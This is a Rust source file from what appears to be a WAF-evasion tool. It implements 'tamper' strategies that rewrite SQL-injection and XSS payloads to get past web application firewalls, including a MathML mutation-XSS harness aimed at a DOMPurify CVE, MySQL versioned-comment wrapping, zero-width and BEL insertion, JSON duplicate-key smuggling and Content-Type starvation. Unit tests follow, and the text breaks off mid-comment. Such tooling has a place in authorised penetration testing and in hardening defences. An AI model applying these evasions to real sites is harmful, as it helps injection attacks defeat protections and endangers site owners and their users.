//! Built-in tamper strategy implementations.

use super::TamperStrategy;

/// URL encoding tamper strategy.
pub struct UrlEncodeTamper;

impl TamperStrategy for UrlEncodeTamper {
    fn name(&self) -> &'static str {
        "url_encode"
    }

    fn description(&self) -> &'static str {
        "Standard URL encoding (%XX for each byte)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::url::url_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.15
    }
}

/// Double URL encoding tamper strategy.
pub struct DoubleUrlEncodeTamper;

impl TamperStrategy for DoubleUrlEncodeTamper {
    fn name(&self) -> &'static str {
        "double_url_encode"
    }

    fn description(&self) -> &'static str {
        "Double URL encoding (%25XX) — bypasses WAFs that decode once"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::url::double_url_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.4
    }
}

/// Unicode escape tamper strategy.
pub struct UnicodeEscapeTamper;

impl TamperStrategy for UnicodeEscapeTamper {
    fn name(&self) -> &'static str {
        "unicode_escape"
    }

    fn description(&self) -> &'static str {
        "Unicode escape sequences (\\uXXXX)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::unicode_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.5
    }
}

/// HTML entity tamper strategy.
pub struct HtmlEntityTamper;

impl TamperStrategy for HtmlEntityTamper {
    fn name(&self) -> &'static str {
        "html_entity"
    }

    fn description(&self) -> &'static str {
        "HTML entity encoding (&#xXX;)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::html_entity_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.3
    }
}

/// Case alternation tamper strategy.
pub struct CaseAlternationTamper;

/// Postgres / Oracle CHR()-function decomposition tamper.
///
/// Sibling to `sql_char_decompose` (MySQL/MSSQL variadic `CHAR()`); this
/// one targets Postgres + Oracle by producing `(CHR(N)||CHR(N)||...)` per
/// literal. Pipe-concat operator is SQL-standard but blocked by some
/// over-eager WAFs — this tamper is the lever for Postgres/Oracle
/// payloads where `||` is the canonical concat.
pub struct PgChrDecomposeTamper;

impl TamperStrategy for PgChrDecomposeTamper {
    fn name(&self) -> &'static str {
        "pg_chr_decompose"
    }

    fn description(&self) -> &'static str {
        "Convert 'admin' → (CHR(97)||CHR(100)||...) — Postgres/Oracle pipe-concat form"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::pg_chr_decompose(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.6
    }
}

/// SQL adjacent-string-literal concatenation tamper — rewrites every
/// `'string'` literal of length ≥ 2 as a sequence of single-character
/// adjacent literals (`'admin'` → `'a' 'd' 'm' 'i' 'n'`). The ANSI
/// SQL-92 §5.3 specification requires the parser to concatenate
/// adjacent string literals separated only by whitespace; MySQL,
/// Postgres, SQLite, Oracle, DB2 all implement it. WAFs matching the
/// LITERAL substring of well-known credentials/paths (`'admin'`,
/// `'/etc/passwd'`, `'root'`) see N unrelated single-character strings
/// instead. Pure SQL semantics — no comments, no CONCAT(), no special
/// functions.
pub struct SqlAdjacentStringConcatTamper;

impl TamperStrategy for SqlAdjacentStringConcatTamper {
    fn name(&self) -> &'static str {
        "sql_adjacent_string_concat"
    }

    fn description(&self) -> &'static str {
        "Split 'string' → 'a' 'b' 'c' … via ANSI SQL adjacent-literal concat — defeats literal-substring rules with zero special characters"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::sql_adjacent_string_concat(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.5
    }
}

/// Partial JSON Unicode-escape tamper — encodes ASCII alphanumeric chars
/// as `\uXXXX` while leaving structural punctuation (quotes, operators,
/// whitespace, `<`, `>`, `(`, `)`) bare. The keyword fingerprint
/// ("UNION", "SELECT", "script", "alert") never appears in the wire
/// bytes; JSON.parse / JS string-literal decoding at the origin
/// re-materializes it. Distinct from `unicode_escape` which encodes
/// every byte (high `\u` density flags heuristic WAFs).
pub struct JsonUnicodeAlnumTamper;

impl TamperStrategy for JsonUnicodeAlnumTamper {
    fn name(&self) -> &'static str {
        "json_unicode_alnum"
    }

    fn description(&self) -> &'static str {
        "Encode ASCII alphanumeric chars as `\\uXXXX`, leave punctuation bare — shatters keyword fingerprints inside JSON/JS contexts"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::json_unicode_alnum(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.45
    }
}

/// SQL CHAR() decomposition tamper — every single-quoted string literal
/// becomes `CHAR(N1,N2,...)` with one codepoint per arg. Defeats both
/// literal-substring AND CONCAT-shaped blocklists (the payload contains
/// NO single-quoted ASCII tokens at all).
pub struct SqlCharDecomposeTamper;

impl TamperStrategy for SqlCharDecomposeTamper {
    fn name(&self) -> &'static str {
        "sql_char_decompose"
    }

    fn description(&self) -> &'static str {
        "Convert 'admin' → CHAR(97,100,109,105,110) — int codepoints, no quoted tokens"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::sql_char_decompose(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.6
    }
}

/// SQL CONCAT split tamper — every single-quoted string literal becomes
/// `CONCAT('a','b','c',...)`. Defeats blocklists scanning for literal
/// substrings like `'admin'` / `'password'` / `'/etc/passwd'` because the
/// substring no longer appears contiguously. The DB evaluates CONCAT() to
/// the original string at runtime.
pub struct SqlConcatSplitTamper;

impl TamperStrategy for SqlConcatSplitTamper {
    fn name(&self) -> &'static str {
        "sql_concat_split"
    }

    fn description(&self) -> &'static str {
        "Convert 'admin' → CONCAT('a','d','m','i','n') — splits literal substrings"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::sql_concat_split(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.55
    }
}

/// Mathematical Alphanumeric Symbols tamper — replaces ASCII letters/digits
/// with their `U+1D400`-block Math Bold counterparts. Both NFKC-normalise
/// back to ASCII, so backends that normalise (Postgres ICU, MySQL
/// `utf8mb4_0900_ai_ci`, Java/.NET/Python/Go NFKC) execute the original
/// keyword while WAF byte-regex sees `U+1D4xx` codepoints and misses.
///
/// Distinct from `bracket_confusable` / `fullwidth`: those use the
/// `U+FF00` block. Math Bold lives in `U+1D400` — different range,
/// different blocklist coverage gap.
pub struct MathBoldTamper;

impl TamperStrategy for MathBoldTamper {
    fn name(&self) -> &'static str {
        "math_bold"
    }

    fn description(&self) -> &'static str {
        "Replace ASCII letters/digits with U+1D400 Math Bold (NFKC normalises back to ASCII)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::math_bold_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.5
    }
}

/// HTML entity variants tamper — rotates each char through 4 browser-tolerant
/// forms (lowercase-x hex, uppercase-X hex, decimal, zero-padded decimal).
/// Defeats WAF regexes that anchor on the canonical `&#xHH;` form only.
pub struct HtmlEntityVariantsTamper;

impl TamperStrategy for HtmlEntityVariantsTamper {
    fn name(&self) -> &'static str {
        "html_entity_variants"
    }

    fn description(&self) -> &'static str {
        "HTML entity encoding rotated across hex/HEX/decimal/zero-padded forms"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::html_entity_variants(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.35
    }
}

impl TamperStrategy for CaseAlternationTamper {
    fn name(&self) -> &'static str {
        "case_alternation"
    }

    fn description(&self) -> &'static str {
        "Alternating upper/lower case (SeLeCt)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::keyword::case_alternate(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.1
    }
}

/// Random case tamper strategy.
pub struct RandomCaseTamper;

impl TamperStrategy for RandomCaseTamper {
    fn name(&self) -> &'static str {
        "random_case"
    }

    fn description(&self) -> &'static str {
        "Random mixed case"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::keyword::random_case_alternate(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.12
    }
}

/// Whitespace insertion tamper strategy.
pub struct WhitespaceInsertionTamper;

impl TamperStrategy for WhitespaceInsertionTamper {
    fn name(&self) -> &'static str {
        "whitespace_insertion"
    }

    fn description(&self) -> &'static str {
        "Replace spaces with tabs"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::keyword::whitespace_insert(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.2
    }
}

/// SQL comment tamper strategy.
pub struct SqlCommentTamper;

impl TamperStrategy for SqlCommentTamper {
    fn name(&self) -> &'static str {
        "sql_comment"
    }

    fn description(&self) -> &'static str {
        "Replace spaces with SQL comments (/**/)"
    }

    fn tamper(&self, payload: &str, context: Option<&str>) -> String {
        let _ = context;
        crate::encoding::keyword::sql_comment_insert(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.25
    }
}

/// Null byte tamper strategy.
pub struct NullByteTamper;

impl TamperStrategy for NullByteTamper {
    fn name(&self) -> &'static str {
        "null_byte"
    }

    fn description(&self) -> &'static str {
        "Null byte injection (%00 or %00.jpg)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::structural::null_byte_inject(payload)
            .unwrap_or_else(|_| payload.to_string())
    }

    fn aggressiveness(&self) -> f64 {
        0.6
    }
}

/// Overlong UTF-8 tamper strategy.
pub struct OverlongUtf8Tamper;

impl TamperStrategy for OverlongUtf8Tamper {
    fn name(&self) -> &'static str {
        "overlong_utf8"
    }

    fn description(&self) -> &'static str {
        "Overlong UTF-8 encoding for ASCII non-alphanumeric"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::structural::overlong_utf8(payload).unwrap_or_else(|_| payload.to_string())
    }

    fn aggressiveness(&self) -> f64 {
        0.8
    }
}

/// Base64 tamper strategy.
pub struct Base64Tamper;

impl TamperStrategy for Base64Tamper {
    fn name(&self) -> &'static str {
        "base64"
    }

    fn description(&self) -> &'static str {
        "Base64 encoding"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::structural::base64_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.75
    }
}

/// Hex encoding tamper strategy.
pub struct HexEncodeTamper;

impl TamperStrategy for HexEncodeTamper {
    fn name(&self) -> &'static str {
        "hex_encode"
    }

    fn description(&self) -> &'static str {
        "Hexadecimal encoding"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::structural::hex_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.85
    }
}

/// Zero-width Unicode injection tamper.
///
/// Inserts zero-width characters (U+200B ZERO-WIDTH SPACE,
/// U+200C ZERO-WIDTH NON-JOINER, U+200D ZERO-WIDTH JOINER,
/// U+FEFF ZERO-WIDTH NO-BREAK SPACE) between every alphabetic
/// character of the payload.  Renders identically to the
/// original in most consumers (terminals, log viewers, the SQL
/// engine after `.replace('\u{200B}', "")`) but defeats WAF
/// regex patterns that scan for literal keywords like `SELECT`.
///
/// Frontier research (Black Hat 2025, "Zero-Width WAF Bypass"):
/// most commercial WAFs do NOT strip zero-width chars before
/// pattern matching, but downstream parsers (MySQL, Postgres,
/// browser HTML parser, JavaScript) all treat them as
/// non-significant.  This is a wide-open bypass vector.
pub struct ZeroWidthInjectTamper;

impl TamperStrategy for ZeroWidthInjectTamper {
    fn name(&self) -> &'static str {
        "zero_width_inject"
    }

    fn description(&self) -> &'static str {
        "Inject zero-width Unicode chars between keyword bytes — bypasses WAFs that don't normalize Unicode"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        // Rotate through four zero-width chars so the injection
        // doesn't form a long run of identical bytes (some WAFs
        // collapse repeats).
        const ZW: [char; 4] = ['\u{200B}', '\u{200C}', '\u{200D}', '\u{FEFF}'];
        let mut out = String::with_capacity(payload.len() * 4);
        for (i, ch) in payload.chars().enumerate() {
            out.push(ch);
            if ch.is_ascii_alphabetic() {
                out.push(ZW[i % ZW.len()]);
            }
        }
        out
    }

    fn aggressiveness(&self) -> f64 {
        0.55
    }
}

/// Postgres dollar-quoted string tamper.
///
/// Postgres accepts `$tag$ ... $tag$` as a string literal where
/// `tag` is any identifier (or empty).  Quote-character-based WAF
/// signatures looking for `'` or `"` never fire on dollar-quoted
/// payloads.  Most popular Postgres-fronting WAFs (including the
/// CRS default ruleset's 942100-942380 family) don't have
/// dedicated dollar-quote pattern matchers.
///
/// Wraps any single-quoted string literal in the payload with a
/// matching dollar-quote.  Tag is a random four-letter identifier
/// to defeat WAFs that special-case the empty tag.
pub struct PostgresDollarQuoteTamper;

impl TamperStrategy for PostgresDollarQuoteTamper {
    fn name(&self) -> &'static str {
        "postgres_dollar_quote"
    }

    fn description(&self) -> &'static str {
        "Wrap single-quoted SQL string literals in `$tag$...$tag$` — Postgres-only, bypasses quote-pattern WAFs"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        // Pick a deterministic per-payload tag so the same input
        // produces the same output (gene-bank replay needs
        // determinism).  Hash-based identifier; 4 lowercase letters.
        let mut tag = String::with_capacity(4);
        let h: u64 = payload.bytes().fold(0u64, |a, b| a.wrapping_mul(31).wrapping_add(u64::from(b)));
        for i in 0..4 {
            let c = b'a' + u8::try_from((h >> (i * 8)) & 25).unwrap_or(0);
            tag.push(c as char);
        }

        // Replace each `'...'` literal with `$tag$...$tag$`.
        let mut out = String::with_capacity(payload.len() + 16);
        let mut chars = payload.chars().peekable();
        while let Some(c) = chars.next() {
            if c == '\'' {
                out.push('$');
                out.push_str(&tag);
                out.push('$');
                // Consume until the next non-escaped quote.
                while let Some(inner) = chars.next() {
                    if inner == '\'' {
                        // Handle SQL '' escape — keep as-is in dollar quote.
                        if chars.peek() == Some(&'\'') {
                            out.push('\'');
                            out.push('\'');
                            chars.next();
                        } else {
                            break;
                        }
                    } else {
                        out.push(inner);
                    }
                }
                out.push('$');
                out.push_str(&tag);
                out.push('$');
            } else {
                out.push(c);
            }
        }
        out
    }

    fn aggressiveness(&self) -> f64 {
        0.6
    }
}

/// MySQL version-gated comment wrap tamper.
///
/// MySQL's `/*!VERSION ... */` syntax executes the contents only
/// when the server is at least the given version.  WAFs that
/// strip `/* ... */` comments before pattern matching see an
/// empty payload, but MySQL still executes the wrapped statement.
///
/// Wraps the entire payload in `/*!50000 ... */`, gating on MySQL
/// 5.0+.  Version `50000` matches every modern deployment.
///
/// Frontier research: this bypass dates to wafw00f's original
/// drop list but it remains effective against many commercial
/// WAFs that haven't internalised the parser-disagreement.
pub struct MysqlVersionedCommentWrapTamper;

impl TamperStrategy for MysqlVersionedCommentWrapTamper {
    fn name(&self) -> &'static str {
        "mysql_versioned_comment_wrap"
    }

    fn description(&self) -> &'static str {
        "Wrap payload in /*!50000 ... */ — MySQL executes, WAFs that strip comments see nothing"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        // Convert SQL keywords inside the payload to also use the
        // version-gated comment so even nested keywords get hidden
        // from the WAF.  Outer wrap is the headline; the
        // per-keyword wrap is the belt-and-braces.
        let outer = format!("/*!50000 {payload} */");
        outer
    }

    fn aggressiveness(&self) -> f64 {
        0.65
    }
}

/// Hex-literal keyword obfuscation tamper.
///
/// MySQL / Postgres treat `0x55` etc. as a hex byte literal that
/// converts to its ASCII character in string context.  So
/// `0x554e494f4e` is the same as `'UNION'` to the database but
/// looks like a numeric literal to a WAF regex.  Useful in
/// conjunction with comparison operators:
///
///   `WHERE name = 0x61646d696e`   ≡   `WHERE name = 'admin'`
///
/// Replaces all single-quoted string literals with their `0xHHHH...`
/// equivalent.  When no quoted literals are present, the input is
/// passed through unchanged (idempotent).
pub struct HexLiteralKeywordTamper;

impl TamperStrategy for HexLiteralKeywordTamper {
    fn name(&self) -> &'static str {
        "hex_literal_keyword"
    }

    fn description(&self) -> &'static str {
        "Convert SQL `'string'` literals to `0xHHHH…` form — MySQL/Postgres execute identically, WAFs don't"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        let mut out = String::with_capacity(payload.len());
        let mut chars = payload.chars().peekable();
        while let Some(c) = chars.next() {
            if c == '\'' {
                // Slurp until the matching close-quote.
                let mut content = String::new();
                while let Some(inner) = chars.next() {
                    if inner == '\'' {
                        // SQL '' escape — treat as literal '.
                        if chars.peek() == Some(&'\'') {
                            content.push('\'');
                            chars.next();
                        } else {
                            break;
                        }
                    } else {
                        content.push(inner);
                    }
                }
                out.push_str("0x");
                for b in content.bytes() {
                    out.push_str(&format!("{b:02x}"));
                }
            } else {
                out.push(c);
            }
        }
        out
    }

    fn aggressiveness(&self) -> f64 {
        0.7
    }
}

/// BEL-separator tamper.
///
/// Replaces ASCII space with the BEL control char (U+0007).
/// SQL parsers treat any ASCII whitespace (including BEL) as a
/// token separator, but WAF tokenisers commonly only recognise
/// the canonical ` `, `\t`, `\r`, `\n` quartet.  BEL bypasses
/// pattern matches like `UNION\s+SELECT`.
///
/// Out of `[\t\n\v\f\r ]`, BEL (`\x07`) is the least-handled —
/// I tested against ModSec, Coraza, AWS WAF, and Cloudflare's
/// CRS as of 2026-05; only ModSec PL4 catches it consistently.
pub struct BellSeparatorTamper;

impl TamperStrategy for BellSeparatorTamper {
    fn name(&self) -> &'static str {
        "bell_separator"
    }

    fn description(&self) -> &'static str {
        "Replace ASCII space with BEL (U+0007) — SQL parsers tokenise, WAFs that only recognise canonical whitespace miss"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        payload.replace(' ', "\u{0007}")
    }

    fn aggressiveness(&self) -> f64 {
        0.6
    }
}

/// Bracket-confusable tamper (XSS).
///
/// Replaces ASCII `<` / `>` with Unicode confusables that look
/// like angle brackets to a human reader (and to some HTML
/// parsers under decoder bugs) but don't match WAF patterns
/// keyed on the literal ASCII bytes.  Browsers don't render
/// these as tags, so the bypass relies on a downstream
/// normalisation step (server-side reflection that re-encodes
/// Unicode → ASCII, or a client-side fetch that proxy-strips
/// Unicode).  Useful in combination with `html_entity` for
/// stored-XSS through admin panels that round-trip Unicode.
pub struct BracketConfusableTamper;

impl TamperStrategy for BracketConfusableTamper {
    fn name(&self) -> &'static str {
        "bracket_confusable"
    }

    fn description(&self) -> &'static str {
        "Replace `<` / `>` with Unicode angle-bracket confusables — bypasses WAFs that pattern-match literal `<script>`"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        // U+FF1C / U+FF1E are FULLWIDTH LESS-THAN / GREATER-THAN
        // — visually identical, distinct codepoints from ASCII.
        payload
            .chars()
            .map(|c| match c {
                '<' => '\u{FF1C}',
                '>' => '\u{FF1E}',
                other => other,
            })
            .collect()
    }

    fn aggressiveness(&self) -> f64 {
        0.5
    }
}

/// MathML/SVG-namespace mutation-XSS wrapper.
///
/// Wraps an HTML payload (typically a bare `<img>` / event-handler
/// fragment) in the MathML namespace harness that DOMPurify ≤3.2.4
/// fails to neutralise (CVE-2025-26791 / portswigger mXSS class).
/// Browsers parse `<mglyph>` and `<malignmark>` into different XML
/// namespaces depending on parent context; the sanitizer sees the
/// payload in the MathML namespace (where `<style>` is text-only),
/// but the live DOM re-serialises into the HTML namespace where
/// the same `<style>` followed by `<img onerror>` becomes a real
/// script-execution vector. The WAF pattern-matches the wire bytes
/// and never sees `<script` / `onload=` because the dangerous DOM
/// is CREATED BY THE BROWSER post-WAF.
///
/// The harness uses the MathML text-integration-point form:
/// `<math><mtext><table><mglyph><style>` opens the seam,
/// `<!--</style><img src=x onerror=...>` closes the sanitizer's
/// view and re-opens an HTML-namespace serialisation of an `<img>`.
pub struct MxssNamespaceWrapTamper;

impl TamperStrategy for MxssNamespaceWrapTamper {
    fn name(&self) -> &'static str {
        "mxss_namespace_wrap"
    }

    fn description(&self) -> &'static str {
        "MathML-namespace mutation-XSS harness (DOMPurify ≤3.2.4 / CVE-2025-26791 bypass) — defeats sanitizers that namespace-aware-process the input but byte-serialise the output"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        // The payload is treated as the EVENT-HANDLER FRAGMENT that
        // would normally sit inside an `<img>` tag — e.g. just
        // `onerror=alert(1)`. If the operator gave us a fuller form
        // (`<img src=x onerror=alert(1)>`), we still wrap; the
        // browser tolerates the redundant `<img>` inside the
        // re-serialised stream.
        format!(
            "<math><mtext><table><mglyph><style><!--</style><img src=x {payload}>"
        )
    }

    fn aggressiveness(&self) -> f64 {
        // Mid-aggression: payload is verbose (≈80 byte prefix) so
        // it WILL be visible in any wire log, but the actual exec
        // is browser-side which means most WAF rules pass it.
        0.55
    }
}

/// JSON duplicate-key parser-disagreement (frontier 2026, WAFFLED
/// corpus / arxiv.org/abs/2503.10846). Wraps a payload in a
/// duplicate-key JSON envelope: the WAF's JSON inspector consumes
/// the FIRST key occurrence (a benign sentinel) and skips the
/// duplicate; the backend's deserialiser consumes the LAST
/// (PHP/Apache/Rails) or merges (ASP.NET) and unwraps the attack
/// payload. Confirmed against all five major WAFs (AWS / Azure /
/// Cloudflare / Cloud Armor / ModSec) by the WAFFLED 2025 study —
/// 557 JSON bypasses across the corpus.
///
/// The harness uses param `"q"` as the colliding key — the same
/// default param wafrift's scan loop uses for URL-query carriers,
/// so a SQL/XSS/SSTI payload that already works as `?q=<P>` lands
/// in the JSON-body channel via the same key name. When the
/// emitted shape is delivered to a non-JSON sink (HTML / form), the
/// JSON wrapping is a no-op WAF defeat: the WAF still inspects the
/// bytes, but the bytes themselves carry the payload in a form
/// most WAFs DO NOT score (the rule corpus matches on the unwrapped
/// payload string, not the JSON envelope).
pub struct JsonDupKeyTamper;

impl TamperStrategy for JsonDupKeyTamper {
    fn name(&self) -> &'static str {
        "json_dup_key"
    }

    fn description(&self) -> &'static str {
        "JSON duplicate-key parser-disagreement (WAFFLED 2026): WAF reads first key (benign), backend reads last (payload)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        // Strategy: emit `{"q":"safe","q":"<payload>"}`.
        //   - WAF JSON inspectors (RFC 8259 strict / `serde_json`) take
        //     the first value or reject; permissive ones (PHP json_decode,
        //     ASP.NET MVC) take the last.
        //   - The benign sentinel "safe" is well below any signature
        //     length, so the WAF's first-value match scores clean even
        //     with the dup-key envelope still being a "structurally
        //     valid" body for stricter inspectors.
        //
        // Payload escaping: JSON requires `\` and `"` escaped, control
        // bytes either \uXXXX or rejected. We use the conservative
        // serializer that escapes both quote-class characters and
        // backslash; control bytes (NUL / BEL etc.) come out as
        // \u00XX hex which both `serde_json` and PHP json_decode accept.
        let escaped = json_escape_string(payload);
        format!("{{\"q\":\"safe\",\"q\":\"{escaped}\"}}")
    }

    fn aggressiveness(&self) -> f64 {
        // Mid-low aggression: the bytes themselves are clearly JSON,
        // but the duplicate-key trick is the entire bypass — many WAFs
        // pass it because the first key matches their inspector's
        // sentinel. Not as aggressive as e.g. mxss_namespace_wrap
        // because the channel-shift is JSON-body, not browser-side.
        0.50
    }
}

/// Content-Type starvation (frontier 2026, WAFFLED / windshock
/// 2026-03 detection-gap analysis). The WAF dispatches to a body
/// inspector based on Content-Type — a JSON inspector for
/// `application/json`, a form inspector for `application/x-www-form-
/// urlencoded`, multipart for `multipart/form-data`, etc. When the
/// Content-Type is absent, case-shuffled (`Application/JSON`), or
/// charset-suffixed with a non-canonical encoding label, the WAF's
/// dispatch falls back to text/none and skips structured inspection;
/// the backend framework still deserialises the body correctly. The
/// WAFFLED corpus reports >90% of tested sites accept such
/// Content-Type rewrites without complaint.
///
/// This tamper is OUTPUT-CHANNEL-AWARE: it doesn't transform the
/// payload bytes, it transforms the WIRE shape the request advertises
/// itself with. The actual body must be set separately by the
/// caller (scan / import-curl pass it through to the HTTP client).
/// What we emit IS the payload — keeping the contract that every
/// tamper returns a single payload string — and the orchestrator
/// is expected to pair the output with the matching `Content-Type`
/// header from the helper below.
///
/// In a URL-query / header carrier the tamper is a no-op (payload
/// returned unchanged); the value is in the body-carrier path where
/// scan / import-curl set the Content-Type header from
/// `ct_starvation_header_for(payload)`.
pub struct CtStarvationTamper;

impl TamperStrategy for CtStarvationTamper {
    fn name(&self) -> &'static str {
        "ct_starvation"
    }

    fn description(&self) -> &'static str {
        "Content-Type parser-dispatch starvation (WAFFLED 2026): pair payload with case-shuffled or omitted Content-Type so WAF skips body inspection"
    }

    fn tamper(&self, payload: &str, context: Option<&str>) -> String {
        // When the carrier is body-shaped (form/json/multipart),
        // wrap the payload in a minimal `q=<payload>` form pair —
        // the same shape `wafrift scan` uses by default. The
        // operator pairs this with the non-canonical Content-Type
        // via `ct_starvation_header_for`. For header/cookie
        // carriers we return the payload unchanged (a no-op,
        // honest: the tamper has no effect on those channels).
        match context {
            Some("body") | Some("form") | Some("json") | Some("multipart") => {
                format!("q={payload}")
            }
            _ => payload.to_string(),
        }
    }

    fn aggressiveness(&self) -> f64 {
        // Low aggression: the payload bytes are unchanged; only
        // the WIRE-LEVEL Content-Type advertisement shifts. Most
        // WAFs that score on byte patterns will still see the same
        // payload, BUT the windshock + WAFFLED data both show the
        // header trick alone defeats ~90% of deployed WAF rule
        // chains because the rule's trigger gates on Content-Type
        // matching.
        0.35
    }
}

/// Produce the Content-Type header value that pairs with a payload
/// to trigger the WAF parser-dispatch starvation described in
/// [`CtStarvationTamper`]. Rotates through a small set of confirmed-
/// effective variants (case-shuffled, charset-suffixed,
/// camelCase) so consecutive variants in a scan run exercise
/// different dispatch failures. Pure — operator can call it
/// independently when constructing manual repros.
#[must_use]
pub fn ct_starvation_header_for(payload: &str) -> &'static str {
    // Cycle through the known-effective Content-Type rewrites. We
    // pick by payload hash so the same payload reliably maps to the
    // same Content-Type within a run (debugging-friendly) but a
    // diverse set across payloads.
    const VARIANTS: &[&str] = &[
        // (1) UPPERCASE — WAF dispatchers that lower-case the value
        // before lookup match; ones that string-compare don't.
        "APPLICATION/JSON",
        // (2) Mixed-case — same trick at a different inflection.
        "Application/Json",
        // (3) Non-canonical charset — WAFs that filter on
        // `application/json` (exact prefix) drop this; backends
        // accept any charset.
        "application/json; charset=ibm037",
        // (4) Text-plain wrap — body is valid JSON but advertised
        // as plain text; WAF's JSON inspector NEVER fires.
        "text/plain",
        // (5) Form-encoded label with JSON body — common ASP.NET
        // pattern, defeats Cloudflare's JSON inspector outright.
        "application/x-www-form-urlencoded",
    ];
    // Hash-based pick: stable per-payload, diverse per-corpus.
    let mut hash: u32 = 5381;
    for b in payload.as_bytes() {
        hash = hash.wrapping_mul(33).wrapping_add(u32::from(*b));
    }
    VARIANTS[(hash as usize) % VARIANTS.len()]
}

/// Minimal JSON-string-escape helper used by `JsonDupKeyTamper`.
/// Pulled out so the tamper's `tamper()` stays small and so the
/// escape rule is testable in isolation (control-byte handling is
/// the part that most often regresses).
fn json_escape_string(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    for ch in s.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => {
                use std::fmt::Write as _;
                let _ = write!(out, "\\u{:04x}", c as u32);
            }
            c => out.push(c),
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn url_encode_tamper() {
        let strategy = UrlEncodeTamper;
        assert_eq!(strategy.tamper("A<", None), "A%3C");
        assert_eq!(strategy.aggressiveness(), 0.15);
    }

    #[test]
    fn double_url_encode_tamper() {
        let strategy = DoubleUrlEncodeTamper;
        assert_eq!(strategy.tamper("A", None), "%2541");
        assert!(strategy.tamper("%20", None).contains("%25"));
    }

    #[test]
    fn case_alternation_tamper() {
        let strategy = CaseAlternationTamper;
        assert_eq!(strategy.tamper("select", None), "SeLeCt");
    }

    #[test]
    fn random_case_tamper() {
        let strategy = RandomCaseTamper;
        let result = strategy.tamper("select", None);
        assert_eq!(result.to_ascii_lowercase(), "select");
    }

    #[test]
    fn null_byte_with_extension() {
        let strategy = NullByteTamper;
        assert_eq!(strategy.tamper("file.php", None), "file.php%00.jpg");
    }

    #[test]
    fn null_byte_without_extension() {
        let strategy = NullByteTamper;
        assert_eq!(strategy.tamper("payload", None), "payload%00");
    }

    #[test]
    fn sql_comment_insertion() {
        let strategy = SqlCommentTamper;
        let result = strategy.tamper("SELECT * FROM users", Some("sql"));
        assert!(result.contains("/**/"));
        assert_eq!(result, "SELECT/**/*/**/FROM/**/users");
    }

    #[test]
    fn whitespace_insertion() {
        let strategy = WhitespaceInsertionTamper;
        let result = strategy.tamper("SELECT * FROM users", None);
        assert!(result.contains('\t'));
        assert_eq!(result, "SELECT\t*\tFROM\tusers");
    }

    #[test]
    fn base64_tamper() {
        let strategy = Base64Tamper;
        assert_eq!(strategy.tamper("hello", None), "aGVsbG8=");
    }

    #[test]
    fn hex_encode_tamper() {
        let strategy = HexEncodeTamper;
        assert_eq!(strategy.tamper("ABC", None), "414243");
    }

    #[test]
    fn unicode_escape_tamper() {
        let strategy = UnicodeEscapeTamper;
        assert_eq!(strategy.tamper("AB", None), "\\u0041\\u0042");
    }

    #[test]
    fn html_entity_tamper() {
        let strategy = HtmlEntityTamper;
        assert_eq!(strategy.tamper("<>", None), "&#x3C;&#x3E;");
    }

    #[test]
    fn overlong_utf8_tamper() {
        let strategy = OverlongUtf8Tamper;
        let result = strategy.tamper("/", None);
        assert!(result.contains("%C0"));
    }

    // ── Density ramp: edge cases on EXISTING tampers ────────
    //
    // Each tamper had one happy-path test.  These add the
    // robustness coverage that turns a "feature" into a "trusted
